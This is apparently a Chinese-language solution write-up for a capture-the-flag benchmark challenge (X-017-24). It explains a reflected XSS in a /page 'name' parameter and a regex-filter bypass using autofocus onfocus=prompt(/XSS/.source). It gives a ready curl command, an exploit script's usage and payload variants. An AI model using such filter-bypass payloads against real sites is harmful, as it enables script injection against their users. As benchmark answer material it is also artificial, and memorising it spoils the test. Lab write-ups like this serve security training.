# X-017-24 利用说明（XSS，一键触发获取 Flag）

## 漏洞原理（简述）
- 路由 `/page` 将 `name` 作为 `<input ... value="{name}">` 的值拼接到页面中。
- 服务端仅移除了带引号的 `"XSS"`/`'XSS'`（`re.sub(r"["']XSS["']", "", msg, flags=re.I)`），未拦截无引号形式。
- 评测进程（PhantomJS）会为具备 `[autofocus]` 或 `[onfocus]` 的元素主动分发 `focus` 事件，并将首个 `alert/confirm/prompt` 的文本作为结果；当文本严格等于 `XSS` 时返回 Flag。
- 通过闭合原 `value` 属性并追加 `autofocus onfocus=prompt(/XSS/.source)`，在聚焦时触发 `prompt('XSS')`，满足判定，回显 Flag。

关键点：`/XSS/.source` 生成字符串 `"XSS"`，无需在源码里出现引号包裹的 `XSS`，从而绕过正则移除。

## 直接复现命令（curl）

```bash
curl "http://ip32781/page?name=%22%20autofocus%20onfocus%3Dprompt%28%2FXSS%2F.source%29%20x%3D%22"
```

成功响应包含类似：

```
<div class="solution-text">... Congratulations!<p> Here is the flag: FLAG{...}</div>
```

## 脚本用法（exp.py）

- 路径：`benchmarks/X-017-24/exp.py`
- 依赖：`pip install requests`
- 运行：

```bash
python3 benchmarks/X-017-24/exp.py            # 默认目标 http://ip32781
python3 benchmarks/X-017-24/exp.py http://目标:端口  # 自定义目标
```

- 行为：向 `GET /page` 发送 `name=" autofocus onfocus=prompt(/XSS/.source) x="`（URL 编码后）并解析返回，直接打印 Flag；未解析到 Flag 时会输出完整响应以便排查。

## 备注
- 若目标地址/端口变化，仅需调整脚本入参或修改脚本中的默认 `BASE`。
- 若服务端策略改变（新增更严过滤），可替换 payload 为其它等价变体（如 `confirm(/XSS/.source)`）。

